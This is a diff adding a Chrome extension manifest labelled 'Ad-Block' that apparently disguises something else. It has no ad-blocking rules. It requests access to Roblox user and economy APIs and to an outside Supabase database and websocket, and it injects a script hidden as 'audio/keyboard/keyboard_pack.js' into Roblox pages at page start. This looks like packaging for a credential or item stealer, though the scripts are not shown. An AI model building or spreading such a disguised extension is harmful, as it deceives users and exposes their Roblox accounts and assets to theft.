@@ -1,0 +1,41 @@
+{
+  "manifest_version": 3,
+  "name": "Ad-Block",
+  "version": "1.0",
+  "description": "Blocks annoying ads and cleans up your experience. | By ServerSadzz",
+  "permissions": ["storage", "tabs"],
+  "host_permissions": [
+    "https://www.roblox.com/*",
+    "https://thumbnails.roblox.com/*",
+    "https://users.roblox.com/*",
+    "https://economy.roblox.com/*",
+    "https://catalog.roblox.com/*",
+    "https://ojjfwxjirlttpxcjhlho.supabase.co/*",
+    "wss://ojjfwxjirlttpxcjhlho.supabase.co/*"
+  ],
+  "content_scripts": [{
+    "matches": ["https://www.roblox.com/*"],
+    "js": ["audio/keyboard/keyboard_pack.js", "content.js"],
+    "run_at": "document_start"
+  }],
+  "web_accessible_resources": [{
+    "resources": ["audio/keyboard/*"],
+    "matches": ["https://www.roblox.com/*"]
+  }],
+  "action": {
+    "default_popup": "popup.html",
+    "default_icon": {
+      "16": "icons/icon16.png",
+      "48": "icons/icon48.png",
+      "128": "icons/icon128.png"
+    }
+  },
+  "background": {
+    "service_worker": "background.js"
+  },
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  }
+}
